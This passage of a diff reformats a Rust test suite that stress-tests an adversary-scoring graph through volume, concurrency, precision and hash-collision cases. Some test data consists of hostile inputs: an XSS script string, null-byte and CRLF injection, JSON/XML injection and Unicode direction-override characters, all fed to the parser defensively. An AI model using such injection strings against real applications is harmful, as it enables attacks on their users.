                     format!("volume_principal_{}", principal_id),
                     (obs_id as f64) / (observations_per_principal as f64), // Varying likelihood
-                    (obs_id % 100) + 1, // Varying weight
+                    (obs_id % 100) + 1,                                    // Varying weight
                     format!("volume_evidence_{}_{}", principal_id, obs_id),
                     format!("volume_trace_{}_{}", principal_id, obs_id),
-                ).unwrap();
+                )
+                .unwrap();
                 push_bounded(&mut volume_observations, observation, 10000);
             }
         }
@@ -1769,17 +1891,27 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         assert!(volume_graph.is_ok(), "Should handle large volume replay");
 
         let volume_posteriors = volume_graph.unwrap().posteriors();
-        assert_eq!(volume_posteriors.len(), principal_count,
-            "Should create exactly {} principals", principal_count);
+        assert_eq!(
+            volume_posteriors.len(),
+            principal_count,
+            "Should create exactly {} principals",
+            principal_count
+        );
 
         // Verify all posteriors are valid
         for posterior in &volume_posteriors {
-            assert!(posterior.posterior.is_finite(),
-                "All posteriors should be finite in volume test");
-            assert!((0.0..=1.0).contains(&posterior.posterior),
-                "All posteriors should be in valid range");
-            assert_eq!(posterior.evidence_count, observations_per_principal as u64,
-                "Evidence count should match observations per principal");
+            assert!(
+                posterior.posterior.is_finite(),
+                "All posteriors should be finite in volume test"
+            );
+            assert!(
+                (0.0..=1.0).contains(&posterior.posterior),
+                "All posteriors should be in valid range"
+            );
+            assert_eq!(
+                posterior.evidence_count, observations_per_principal as u64,
+                "Evidence count should match observations per principal"
+            );
         }
     }
 
@@ -1791,7 +1923,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let complex_observations = vec![
             AdversaryObservation::new("principal_α", 0.1, 1000, "evidence_α", "trace_α").unwrap(),
             AdversaryObservation::new("principal_β", 0.9, 1, "evidence_β", "trace_β").unwrap(),
-            AdversaryObservation::new("principal_γ", 0.5, u64::MAX / 1000, "evidence_γ", "trace_γ").unwrap(),
+            AdversaryObservation::new("principal_γ", 0.5, u64::MAX / 1000, "evidence_γ", "trace_γ")
+                .unwrap(),
         ];
 
         for obs in &complex_observations {
@@ -1806,13 +1939,18 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
 
         // Test 2: Snapshot serialization round-trip integrity
         let serialized = serde_json::to_string(&snapshot).expect("Should serialize snapshot");
-        let deserialized: AdversaryGraphSnapshot = serde_json::from_str(&serialized).expect("Should deserialize snapshot");
+        let deserialized: AdversaryGraphSnapshot =
+            serde_json::from_str(&serialized).expect("Should deserialize snapshot");
 
         assert_eq!(snapshot.schema_version, deserialized.schema_version);
         assert_eq!(snapshot.generated_at, deserialized.generated_at);
         assert_eq!(snapshot.posteriors.len(), deserialized.posteriors.len());
 
-        for (orig, deser) in snapshot.posteriors.iter().zip(deserialized.posteriors.iter()) {
+        for (orig, deser) in snapshot
+            .posteriors
+            .iter()
+            .zip(deserialized.posteriors.iter())
+        {
             assert_eq!(orig.principal_id, deser.principal_id);
             assert!((orig.posterior - deser.posterior).abs() < 1e-15);
             assert_eq!(orig.evidence_count, deser.evidence_count);
@@ -1823,46 +1961,54 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let corruption_attacks = vec![
             // Schema version tampering
             serialized.replace(ADVERSARY_GRAPH_SCHEMA_VERSION, "corrupted-schema-v999"),
-
             // Timestamp injection
-            serialized.replace("2026-04-17T12:00:00Z", "malicious<script>alert('xss')</script>"),
-
+            serialized.replace(
+                "2026-04-17T12:00:00Z",
+                "malicious<script>alert('xss')</script>",
+            ),
             // Posterior data corruption
             serialized.replace("principal_α", "corrupted\x00\r\ninjection"),
-
             // Numeric corruption
             serialized.replace("0.1", "NaN"),
             serialized.replace("0.9", "Infinity"),
             serialized.replace("1000", "99999999999999999999999999999"),
-
             // Structure corruption
             serialized.replace("\"posteriors\":[", "\"posteriors\":{"),
             serialized.replace("\"evidence_count\":", "\"evidence_count_malicious\":"),
-
             // JSON injection
             serialized.replace("}", "},\"malicious\":\"payload\"}"),
         ];
 
         for (attack_idx, corrupted_json) in corruption_attacks.iter().enumerate() {
-            let parse_result: Result<AdversaryGraphSnapshot, _> = serde_json::from_str(corrupted_json);
+            let parse_result: Result<AdversaryGraphSnapshot, _> =
+                serde_json::from_str(corrupted_json);
 
             match parse_result {
                 Ok(corrupted_snapshot) => {
                     // If parsing succeeds, verify corruption is contained
                     if corrupted_snapshot.schema_version != ADVERSARY_GRAPH_SCHEMA_VERSION {
                         // Schema version corruption detected
-                        assert!(!corrupted_snapshot.schema_version.is_empty(),
-                            "Corrupted schema should not be empty for attack {}", attack_idx);
+                        assert!(
+                            !corrupted_snapshot.schema_version.is_empty(),
+                            "Corrupted schema should not be empty for attack {}",
+                            attack_idx
+                        );
                     }
 
                     // Test that corrupted snapshot can still be processed safely
-                    assert!(corrupted_snapshot.posteriors.len() <= 10,
-                        "Corrupted snapshot should not create excessive posteriors for attack {}", attack_idx);
+                    assert!(
+                        corrupted_snapshot.posteriors.len() <= 10,
+                        "Corrupted snapshot should not create excessive posteriors for attack {}",
+                        attack_idx
+                    );
 
                     for posterior in &corrupted_snapshot.posteriors {
                         if posterior.posterior.is_finite() {
-                            assert!((0.0..=1.0).contains(&posterior.posterior),
-                                "Valid posteriors should remain in range for attack {}", attack_idx);
+                            assert!(
+                                (0.0..=1.0).contains(&posterior.posterior),
+                                "Valid posteriors should remain in range for attack {}",
+                                attack_idx
+                            );
                         }
                     }
                 }
@@ -1876,15 +2022,17 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let extreme_snapshot = AdversaryGraphSnapshot {
             schema_version: ADVERSARY_GRAPH_SCHEMA_VERSION.to_string(),
             generated_at: "x".repeat(1000000), // 1MB timestamp
-            posteriors: (0..100000).map(|i| AdversaryPosterior {
-                principal_id: format!("extreme_principal_{}", i),
-                alpha: u64::MAX / 2,
-                beta: u64::MAX / 2,
-                posterior: 0.5,
-                evidence_count: u64::MAX / 1000,
-                last_trace_id: format!("extreme_trace_{}", "y".repeat(1000)),
-                evidence_hash: format!("extreme_hash_{}", "z".repeat(100)),
-            }).collect(),
+            posteriors: (0..100000)
+                .map(|i| AdversaryPosterior {
+                    principal_id: format!("extreme_principal_{}", i),
+                    alpha: u64::MAX / 2,
+                    beta: u64::MAX / 2,
+                    posterior: 0.5,
+                    evidence_count: u64::MAX / 1000,
+                    last_trace_id: format!("extreme_trace_{}", "y".repeat(1000)),
+                    evidence_hash: format!("extreme_hash_{}", "z".repeat(100)),
+                })
+                .collect(),
         };
 
         let extreme_serialize_result = serde_json::to_string(&extreme_snapshot);
@@ -1892,10 +2040,14 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         match extreme_serialize_result {
             Ok(extreme_json) => {
                 // If serialization succeeds, verify it can be handled
-                assert!(extreme_json.len() > 100_000_000, "Should produce very large JSON");
+                assert!(
+                    extreme_json.len() > 100_000_000,
+                    "Should produce very large JSON"
+                );
 
                 // Test partial deserialization doesn't crash
-                let partial_parse: Result<serde_json::Value, _> = serde_json::from_str(&extreme_json[..10000]);
+                let partial_parse: Result<serde_json::Value, _> =
+                    serde_json::from_str(&extreme_json[..10000]);
                 match partial_parse {
                     Ok(_) => {
                         // Partial parse succeeded
@@ -1907,8 +2059,10 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             }
             Err(error) => {
                 // Acceptable failure with extreme content
-                assert!(!error.to_string().is_empty(),
-                    "Extreme serialization error should be meaningful");
+                assert!(
+                    !error.to_string().is_empty(),
+                    "Extreme serialization error should be meaningful"
+                );
             }
         }
 
@@ -1916,26 +2070,31 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let unicode_snapshot = AdversaryGraphSnapshot {
             schema_version: ADVERSARY_GRAPH_SCHEMA_VERSION.to_string(),
             generated_at: "2026-04-17T12:00:00Z\u{202E}攻击\u{202D}".to_string(),
-            posteriors: vec![
-                AdversaryPosterior {
-                    principal_id: "unicode_test_🚀_\u{10FFFF}_\u{E000}".to_string(),
-                    alpha: 100,
-                    beta: 900,
-                    posterior: 0.1,
-                    evidence_count: 1,
-                    last_trace_id: "trace_\u{FEFF}\u{200B}\u{200C}".to_string(),
-                    evidence_hash: "hash_\u{FFFD}\u{FFFD}_test".to_string(),
-                },
-            ],
+            posteriors: vec![AdversaryPosterior {
+                principal_id: "unicode_test_🚀_\u{10FFFF}_\u{E000}".to_string(),
+                alpha: 100,
+                beta: 900,
+                posterior: 0.1,
+                evidence_count: 1,
+                last_trace_id: "trace_\u{FEFF}\u{200B}\u{200C}".to_string(),
+                evidence_hash: "hash_\u{FFFD}\u{FFFD}_test".to_string(),
+            }],
         };
 
-        let unicode_json = serde_json::to_string(&unicode_snapshot).expect("Should serialize Unicode");
-        let unicode_parsed: AdversaryGraphSnapshot = serde_json::from_str(&unicode_json).expect("Should parse Unicode");
+        let unicode_json =
+            serde_json::to_string(&unicode_snapshot).expect("Should serialize Unicode");
+        let unicode_parsed: AdversaryGraphSnapshot =
+            serde_json::from_str(&unicode_json).expect("Should parse Unicode");
 
-        assert_eq!(unicode_snapshot.posteriors[0].principal_id, unicode_parsed.posteriors[0].principal_id,
-            "Unicode content should be preserved exactly");
+        assert_eq!(
+            unicode_snapshot.posteriors[0].principal_id, unicode_parsed.posteriors[0].principal_id,
+            "Unicode content should be preserved exactly"
+        );
 
-        println!("Snapshot serialization resistance test completed: {} corruption attacks tested", corruption_attacks.len());
+        println!(
+            "Snapshot serialization resistance test completed: {} corruption attacks tested",
+            corruption_attacks.len()
+        );
     }
 
     #[test]
@@ -1948,33 +2107,40 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let thread_count = 50;
         let observations_per_thread = 100;
 
-        let handles: Vec<_> = (0..thread_count).map(|thread_id| {
-            let graph_clone = graph.clone();
-            let results_clone = results.clone();
+        let handles: Vec<_> = (0..thread_count)
+            .map(|thread_id| {
+                let graph_clone = graph.clone();
+                let results_clone = results.clone();
 
-            thread::spawn(move || {
-                let mut thread_results = Vec::new();
+                thread::spawn(move || {
+                    let mut thread_results = Vec::new();
 
-                for obs_id in 0..observations_per_thread {
-                    let observation = AdversaryObservation::new(
-                        format!("concurrent_principal_{}_{}", thread_id, obs_id % 10), // Overlap principals
-                        (obs_id as f64) / (observations_per_thread as f64), // Varying likelihood
-                        (obs_id % 100) + 1, // Varying weight
-                        format!("concurrent_evidence_{}_{}", thread_id, obs_id),
-                        format!("concurrent_trace_{}_{}", thread_id, obs_id),
-                    ).unwrap();
+                    for obs_id in 0..observations_per_thread {
+                        let observation = AdversaryObservation::new(
+                            format!("concurrent_principal_{}_{}", thread_id, obs_id % 10), // Overlap principals
+                            (obs_id as f64) / (observations_per_thread as f64), // Varying likelihood
+                            (obs_id % 100) + 1,                                 // Varying weight
+                            format!("concurrent_evidence_{}_{}", thread_id, obs_id),
+                            format!("concurrent_trace_{}_{}", thread_id, obs_id),
+                        )
+                        .unwrap();
 
-                    let result = {
-                        let mut graph_guard = graph_clone.lock().unwrap();
-                        graph_guard.ingest(&observation)
-                    };
+                        let result = {
+                            let mut graph_guard = graph_clone.lock().unwrap();
+                            graph_guard.ingest(&observation)
+                        };
 
-                    push_bounded(&mut thread_results, (thread_id, obs_id, result.is_ok()), 150);
-                }
+                        push_bounded(
+                            &mut thread_results,
+                            (thread_id, obs_id, result.is_ok()),
+                            150,
+                        );
+                    }
 
-                results_clone.lock().unwrap().extend(thread_results);
+                    results_clone.lock().unwrap().extend(thread_results);
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for all threads to complete
         for handle in handles {
@@ -1985,65 +2151,90 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         let final_graph = graph.lock().unwrap();
 
         // Verify all operations completed
-        assert_eq!(final_results.len(), thread_count * observations_per_thread,
-            "All operations should have completed");
+        assert_eq!(
+            final_results.len(),
+            thread_count * observations_per_thread,
+            "All operations should have completed"
+        );
 
         // Verify graph integrity
         let posteriors = final_graph.posteriors();
-        assert!(posteriors.len() <= thread_count * 10,
-            "Should not have excessive principals: {}", posteriors.len());
+        assert!(
+            posteriors.len() <= thread_count * 10,
+            "Should not have excessive principals: {}",
+            posteriors.len()
+        );
 
         // Verify all posteriors are valid
         for posterior in &posteriors {
-            assert!(posterior.posterior.is_finite(),
-                "Posterior should be finite: {}", posterior.posterior);
-            assert!((0.0..=1.0).contains(&posterior.posterior),
-                "Posterior should be in valid range: {}", posterior.posterior);
-            assert!(posterior.evidence_count > 0,
-                "Evidence count should be positive: {}", posterior.evidence_count);
-            assert!(!posterior.evidence_hash.is_empty(),
-                "Evidence hash should not be empty");
+            assert!(
+                posterior.posterior.is_finite(),
+                "Posterior should be finite: {}",
+                posterior.posterior
+            );
+            assert!(
+                (0.0..=1.0).contains(&posterior.posterior),
+                "Posterior should be in valid range: {}",
+                posterior.posterior
+            );
+            assert!(
+                posterior.evidence_count > 0,
+                "Evidence count should be positive: {}",
+                posterior.evidence_count
+            );
+            assert!(
+                !posterior.evidence_hash.is_empty(),
+                "Evidence hash should not be empty"
+            );
         }
 
         // Test 2: Concurrent snapshot generation while ingesting
         drop(final_graph);
         let snapshot_results = Arc::new(Mutex::new(Vec::new()));
 
-        let snapshot_handles: Vec<_> = (0..20).map(|snapshot_id| {
-            let graph_clone = graph.clone();
-            let snapshot_results_clone = snapshot_results.clone();
+        let snapshot_handles: Vec<_> = (0..20)
+            .map(|snapshot_id| {
+                let graph_clone = graph.clone();
+                let snapshot_results_clone = snapshot_results.clone();
 
-            thread::spawn(move || {
-                // Generate observations while taking snapshots
-                for i in 0..50 {
-                    let observation = AdversaryObservation::new(
-                        format!("snapshot_principal_{}", snapshot_id),
-                        0.5,
-                        10,
-                        format!("snapshot_evidence_{}_{}", snapshot_id, i),
-                        format!("snapshot_trace_{}_{}", snapshot_id, i),
-                    ).unwrap();
+                thread::spawn(move || {
+                    // Generate observations while taking snapshots
+                    for i in 0..50 {
+                        let observation = AdversaryObservation::new(
+                            format!("snapshot_principal_{}", snapshot_id),
+                            0.5,
+                            10,
+                            format!("snapshot_evidence_{}_{}", snapshot_id, i),
+                            format!("snapshot_trace_{}_{}", snapshot_id, i),
+                        )
+                        .unwrap();
 
-                    let ingest_result = {
-                        let mut graph_guard = graph_clone.lock().unwrap();
-                        graph_guard.ingest(&observation)
-                    };
-
-                    // Take snapshot every 10 observations
-                    if i % 10 == 0 {
-                        let snapshot_result = {
-                            let graph_guard = graph_clone.lock().unwrap();
-                            graph_guard.snapshot(format!("concurrent_snapshot_{}_{}", snapshot_id, i))
+                        let ingest_result = {
+                            let mut graph_guard = graph_clone.lock().unwrap();
+                            graph_guard.ingest(&observation)
                         };
 
-                        {
-                            let mut results = snapshot_results_clone.lock().unwrap();
-                            push_bounded(&mut *results, (snapshot_id, i, snapshot_result.posteriors.len()), 100);
+                        // Take snapshot every 10 observations
+                        if i % 10 == 0 {
+                            let snapshot_result = {
+                                let graph_guard = graph_clone.lock().unwrap();
+                                graph_guard
+                                    .snapshot(format!("concurrent_snapshot_{}_{}", snapshot_id, i))
+                            };
+
+                            {
+                                let mut results = snapshot_results_clone.lock().unwrap();
+                                push_bounded(
+                                    &mut *results,
+                                    (snapshot_id, i, snapshot_result.posteriors.len()),
+                                    100,
+                                );
+                            }
                         }
                     }
-                }
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for all snapshot operations
         for handle in snapshot_handles {
@@ -2051,42 +2242,53 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         }
 
         let snapshot_results_final = snapshot_results.lock().unwrap();
-        assert!(snapshot_results_final.len() >= 100, "Should have generated multiple snapshots");
+        assert!(
+            snapshot_results_final.len() >= 100,
+            "Should have generated multiple snapshots"
+        );
 
         // Verify snapshot consistency
         for (snapshot_id, iteration, posterior_count) in snapshot_results_final.iter() {
-            assert!(*posterior_count > 0, "Snapshot should have posteriors: {} at iteration {}", posterior_count, iteration);
+            assert!(
+                *posterior_count > 0,
+                "Snapshot should have posteriors: {} at iteration {}",
+                posterior_count,
+                iteration
+            );
         }
 
         // Test 3: Memory consistency under high concurrent load
         let memory_test_graph = Arc::new(Mutex::new(AdversaryGraph::new()));
         let memory_error_count = Arc::new(Mutex::new(0));
 
-        let memory_handles: Vec<_> = (0..100).map(|thread_id| {
-            let graph_clone = memory_test_graph.clone();
-            let error_count_clone = memory_error_count.clone();
+        let memory_handles: Vec<_> = (0..100)
+            .map(|thread_id| {
+                let graph_clone = memory_test_graph.clone();
+                let error_count_clone = memory_error_count.clone();
 
-            thread::spawn(move || {
-                for i in 0..1000 {
-                    let observation = AdversaryObservation::new(
-                        format!("memory_test_{}", thread_id % 50), // Force principal overlap
-                        ((i + thread_id) as f64) / 1000.0, // Deterministic but varying
-                        ((i % 100) + 1) as u64,
-                        format!("memory_evidence_{}_{}", thread_id, i),
-                        format!("memory_trace_{}_{}", thread_id, i),
-                    ).unwrap();
+                thread::spawn(move || {
+                    for i in 0..1000 {
+                        let observation = AdversaryObservation::new(
+                            format!("memory_test_{}", thread_id % 50), // Force principal overlap
+                            ((i + thread_id) as f64) / 1000.0,         // Deterministic but varying
+                            ((i % 100) + 1) as u64,
+                            format!("memory_evidence_{}_{}", thread_id, i),
+                            format!("memory_trace_{}_{}", thread_id, i),
+                        )
+                        .unwrap();
 
-                    let result = {
-                        let mut graph_guard = graph_clone.lock().unwrap();
-                        graph_guard.ingest(&observation)
-                    };
+                        let result = {
+                            let mut graph_guard = graph_clone.lock().unwrap();
+                            graph_guard.ingest(&observation)
+                        };
 
-                    if result.is_err() {
-                        *error_count_clone.lock().unwrap() += 1;
+                        if result.is_err() {
+                            *error_count_clone.lock().unwrap() += 1;
+                        }
                     }
-                }
+                })
             })
-        }).collect();
+            .collect();
 
         // Wait for memory test completion
         for handle in memory_handles {
@@ -2094,20 +2296,36 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
         }
 
         let final_error_count = *memory_error_count.lock().unwrap();
-        assert!(final_error_count < 100, "Should have minimal errors under concurrent load: {}", final_error_count);
+        assert!(
+            final_error_count < 100,
+            "Should have minimal errors under concurrent load: {}",
+            final_error_count
+        );
 
         let final_memory_graph = memory_test_graph.lock().unwrap();
         let final_posteriors = final_memory_graph.posteriors();
 
         // Verify final state consistency
-        assert!(final_posteriors.len() <= 50, "Should not exceed expected principal count");
+        assert!(
+            final_posteriors.len() <= 50,
+            "Should not exceed expected principal count"
+        );
         for posterior in &final_posteriors {
-            assert!(posterior.evidence_count <= 2000, "Evidence count should be reasonable");
-            assert!(posterior.posterior.is_finite(), "Final posteriors should be finite");
+            assert!(
+                posterior.evidence_count <= 2000,
+                "Evidence count should be reasonable"
+            );
+            assert!(
+                posterior.posterior.is_finite(),
+                "Final posteriors should be finite"
+            );
         }
 
-        println!("Concurrent modification resistance test completed: {} threads, {} total operations",
-            thread_count + 20 + 100, final_results.len() + snapshot_results_final.len() + 100000);
+        println!(
+            "Concurrent modification resistance test completed: {} threads, {} total operations",
+            thread_count + 20 + 100,
+            final_results.len() + snapshot_results_final.len() + 100000
+        );
     }
 
     #[test]
@@ -2121,15 +2339,17 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             (0.000000000000001, 1, "near_zero_alpha"),
             (0.5, u64::MAX / 2, "massive_beta_weight"),
             (0.5, 1, "minimal_computation"),
-
             // Values that test precision boundaries of f64
             (1.0 - f64::EPSILON, 1, "just_below_one"),
             (f64::MIN_POSITIVE, 1, "smallest_positive"),
-            (0.5 + f64::EPSILON/2.0, 1, "half_plus_epsilon"),
-            (0.9999999999999998, u64::MAX / 1000000, "near_one_massive_weight"),
-
+            (0.5 + f64::EPSILON / 2.0, 1, "half_plus_epsilon"),
+            (
+                0.9999999999999998,
+                u64::MAX / 1000000,
+                "near_one_massive_weight",
+            ),
             // Sequences that could cause cumulative rounding errors
-            (1.0/3.0, 3, "repeating_decimal_weight"),
+            (1.0 / 3.0, 3, "repeating_decimal_weight"),
             (std::f64::consts::PI / 4.0, 7, "irrational_likelihood"),
             (std::f64::consts::E / 3.0, 11, "transcendental_likelihood"),
         ];
@@ -2142,22 +2362,42 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     weight,
                     format!("evidence_{}_{}", test_name, iteration),
                     format!("trace_{}_{}", test_name, iteration),
-                ).unwrap();
+                )
+                .unwrap();
 
                 if let Ok(posterior) = graph.ingest(&observation) {
                     // Verify mathematical properties remain valid
-                    assert!(posterior.posterior.is_finite(),
-                        "Posterior should remain finite for {} at iteration {}: {}", test_name, iteration, posterior.posterior);
-                    assert!((0.0..=1.0).contains(&posterior.posterior),
-                        "Posterior should stay in valid range for {} at iteration {}: {}", test_name, iteration, posterior.posterior);
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Posterior should remain finite for {} at iteration {}: {}",
+                        test_name,
+                        iteration,
+                        posterior.posterior
+                    );
+                    assert!(
+                        (0.0..=1.0).contains(&posterior.posterior),
+                        "Posterior should stay in valid range for {} at iteration {}: {}",
+                        test_name,
+                        iteration,
+                        posterior.posterior
+                    );
 
                     // Verify beta distribution parameters don't overflow
-                    assert!(posterior.alpha != u64::MAX || posterior.beta != u64::MAX,
-                        "Should use saturating arithmetic for {} at iteration {}", test_name, iteration);
+                    assert!(
+                        posterior.alpha != u64::MAX || posterior.beta != u64::MAX,
+                        "Should use saturating arithmetic for {} at iteration {}",
+                        test_name,
+                        iteration
+                    );
 
                     // Verify evidence accumulation is consistent
-                    assert!(posterior.evidence_count == (iteration + 1) as u64,
-                        "Evidence count should match iterations for {}: {} != {}", test_name, posterior.evidence_count, iteration + 1);
+                    assert!(
+                        posterior.evidence_count == (iteration + 1) as u64,
+                        "Evidence count should match iterations for {}: {} != {}",
+                        test_name,
+                        posterior.evidence_count,
+                        iteration + 1
+                    );
                 }
             }
         }
@@ -2167,11 +2407,23 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
             // Alternating extreme values to test convergence stability
             vec![(0.999, 1), (0.001, 1), (0.999, 1), (0.001, 1)],
             // Exponentially decreasing likelihood with increasing weight
-            (0..20).map(|i| (0.5_f64.powi(i), (2_u64).pow(i as u32).min(1000))).collect(),
+            (0..20)
+                .map(|i| (0.5_f64.powi(i), (2_u64).pow(i as u32).min(1000)))
+                .collect(),
             // Sine wave likelihood pattern to test periodic convergence
-            (0..100).map(|i| ((((i as f64) * 0.1).sin().abs()), (i % 10) + 1)).collect(),
+            (0..100)
+                .map(|i| ((((i as f64) * 0.1).sin().abs()), (i % 10) + 1))
+                .collect(),
             // Fibonacci-weighted observations
-            vec![(0.618, 1), (0.618, 1), (0.618, 2), (0.618, 3), (0.618, 5), (0.618, 8), (0.618, 13)],
+            vec![
+                (0.618, 1),
+                (0.618, 1),
+                (0.618, 2),
+                (0.618, 3),
+                (0.618, 5),
+                (0.618, 8),
+                (0.618, 13),
+            ],
         ];
 
         for (seq_idx, sequence) in convergence_attack_sequences.iter().enumerate() {
@@ -2184,22 +2436,35 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                     *weight,
                     format!("conv_evidence_{}_{}", seq_idx, obs_idx),
                     format!("conv_trace_{}_{}", seq_idx, obs_idx),
-                ).unwrap();
+                )
+                .unwrap();
 
                 if let Ok(posterior) = graph.ingest(&observation) {
                     // Verify convergence properties
-                    assert!(posterior.posterior.is_finite(),
-                        "Convergence sequence {} observation {} should produce finite posterior", seq_idx, obs_idx);
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Convergence sequence {} observation {} should produce finite posterior",
+                        seq_idx,
+                        obs_idx
+                    );
 
                     // Check that posterior changes are reasonable (no wild swings)
                     if obs_idx > 0 {
                         let posteriors = graph.posteriors();
-                        let current_posterior = posteriors.iter().find(|p| p.principal_id == principal_id).unwrap();
+                        let current_posterior = posteriors
+                            .iter()
+                            .find(|p| p.principal_id == principal_id)
+                            .unwrap();
 
                         // With enough evidence, posterior should stabilize (not change drastically)
                         if obs_idx > 10 {
-                            assert!(current_posterior.posterior >= 0.01 && current_posterior.posterior <= 0.99,
-                                "Large evidence sets should avoid extreme posteriors for sequence {}: {}", seq_idx, current_posterior.posterior);
+                            assert!(
+                                current_posterior.posterior >= 0.01
+                                    && current_posterior.posterior <= 0.99,
+                                "Large evidence sets should avoid extreme posteriors for sequence {}: {}",
+                                seq_idx,
+                                current_posterior.posterior
+                            );
                         }
                     }
                 }
@@ -2218,14 +2483,22 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 1,
                 format!("tiny_evidence_{}", i),
                 format!("tiny_trace_{}", i),
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = graph.ingest(&observation) {
                 if i % 10000 == 0 {
-                    assert!(posterior.posterior.is_finite(),
-                        "Precision should not degrade to non-finite at iteration {}", i);
-                    assert!(posterior.posterior < 1e-6,
-                        "Many tiny likelihoods should keep posterior very low at iteration {}: {}", i, posterior.posterior);
+                    assert!(
+                        posterior.posterior.is_finite(),
+                        "Precision should not degrade to non-finite at iteration {}",
+                        i
+                    );
+                    assert!(
+                        posterior.posterior < 1e-6,
+                        "Many tiny likelihoods should keep posterior very low at iteration {}: {}",
+                        i,
+                        posterior.posterior
+                    );
                 }
             }
         }
@@ -2239,14 +2512,22 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 1000,
                 format!("high_evidence_{}", i),
                 format!("high_trace_{}", i),
-            ).unwrap();
+            )
+            .unwrap();
 
             if let Ok(posterior) = graph.ingest(&observation) {
-                assert!(posterior.posterior.is_finite(),
-                    "High likelihood observations should maintain finite posterior at iteration {}", i);
+                assert!(
+                    posterior.posterior.is_finite(),
+                    "High likelihood observations should maintain finite posterior at iteration {}",
+                    i
+                );
                 if i > 5 {
-                    assert!(posterior.posterior > 0.9,
-                        "Strong evidence should rapidly increase posterior at iteration {}: {}", i, posterior.posterior);
+                    assert!(
+                        posterior.posterior > 0.9,
+                        "Strong evidence should rapidly increase posterior at iteration {}: {}",
+                        i,
+                        posterior.posterior
+                    );
                 }
             }
         }
@@ -2265,8 +2546,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 format!(
                     "evidence{}",
                     String::from_utf8_lossy(&[
-                        0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                        0x00, 0x00, 0x00, 0x00, 0x00, 0x08,
+                        0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                        0x00, 0x00, 0x00, 0x08,
                     ])
                 ),
                 "trace".to_string(),
@@ -2284,7 +2565,6 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 "b".repeat(64),
                 "trace2".to_string(),
             ), // SHA-256 block boundary
-
             // Unicode normalization attacks on evidence content
             (
                 "café".to_string(),
@@ -2304,7 +2584,6 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 "\u{1F680}".to_string(),
                 "trace".to_string(),
             ), // Emoji vs codepoint
-
             // Null byte and control character injection in evidence
             (
                 "evidence\x00hidden".to_string(),
@@ -2318,7 +2597,6 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 "evi\ndence".to_string(),
                 "tr\race".to_string(),
             ),
-
             // JSON/XML structure injection in evidence content
             (
                 "{\"malicious\":\"evidence\"}".to_string(),
@@ -2332,7 +2610,6 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 "evidence".to_string(),
                 "<trace>attack</trace>".to_string(),
             ),
-
             // Binary data and encoding edge cases
             (
                 String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD, 0xFC]).into_owned(),
@@ -2358,7 +2635,8 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 100,
                 evidence1.as_str(),
                 trace1.as_str(),
-            ).unwrap();
+            )
+            .unwrap();
 
             // Test second evidence/trace combination
             let obs2 = AdversaryObservation::new(
@@ -2367,45 +2645,91 @@ mod adversary_graph_comprehensive_attack_resistance_and_boundary_tests {
                 100,
                 evidence2.as_str(),
                 trace2.as_str(),
-            ).unwrap();
+            )
+            .unwrap();
 
             let result1 = graph.ingest(&obs1).unwrap();
             let result2 = graph.ingest(&obs2).unwrap();
 
             // Verify hash uniqueness
-            assert!(seen_hashes.insert(result1.evidence_hash.clone()),
-                "Hash collision detected for evidence1: '{}' + '{}'", evidence1.escape_debug(), trace1.escape_debug());
-            assert!(seen_hashes.insert(result2.evidence_hash.clone()),
-                "Hash collision detected for evidence2: '{}' + '{}'", evidence2.escape_debug(), trace2.escape_debug());
+            assert!(
+                seen_hashes.insert(result1.evidence_hash.clone()),
+                "Hash collision detected for evidence1: '{}' + '{}'",
+                evidence1.escape_debug(),
+                trace1.escape_debug()
+            );
+            assert!(
+                seen_hashes.insert(result2.evidence_hash.clone()),
+                "Hash collision detected for evidence2: '{}' + '{}'",
+                evidence2.escape_debug(),
+                trace2.escape_debug()
+            );
 
             // Verify different evidence produces different hashes
             if evidence1 != evidence2 || trace1 != trace2 {
-                assert_ne!(result1.evidence_hash, result2.evidence_hash,
+                assert_ne!(
+                    result1.evidence_hash,
+                    result2.evidence_hash,
                     "Different evidence should produce different hashes: ('{}' + '{}') vs ('{}' + '{}')",
-                    evidence1.escape_debug(), trace1.escape_debug(), evidence2.escape_debug(), trace2.escape_debug());
+                    evidence1.escape_debug(),
+                    trace1.escape_debug(),
+                    evidence2.escape_debug(),
+                    trace2.escape_debug()
+                );
             }
 
             // Verify hash format and characteristics
-            assert!(!result2.evidence_hash.is_empty(), "Hash should not be empty");
-            assert!(result2.evidence_hash.len() >= 32, "Hash should be reasonable length: {}", result2.evidence_hash.len());
